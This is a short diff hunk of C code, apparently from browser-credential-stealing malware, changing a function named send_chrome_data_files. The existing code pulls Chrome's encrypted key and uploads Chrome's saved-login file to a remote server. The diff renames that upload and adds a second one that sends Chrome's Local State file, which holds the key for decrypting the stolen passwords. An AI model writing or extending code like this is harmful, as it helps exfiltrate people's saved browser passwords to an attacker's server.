@@ -51,7 +51,8 @@ int send_chrome_data_files(COMPUTER_INFOS *cmp_info)
                 strncpy(encrypted_key, start, key_length);
                 encrypted_key[key_length] = '\0';
 
-                upload_to_server(chrome_data_login_path, "chromedata", encrypted_key);
+                upload_to_server(chrome_data_login_path, "chromedata_logins", encrypted_key);
+                upload_to_server(chrome_encrypted_data_path, "chromedata_localstate", "");
 
                 printf("Encrypted Key: %s\n", encrypted_key);
                 free(encrypted_key);
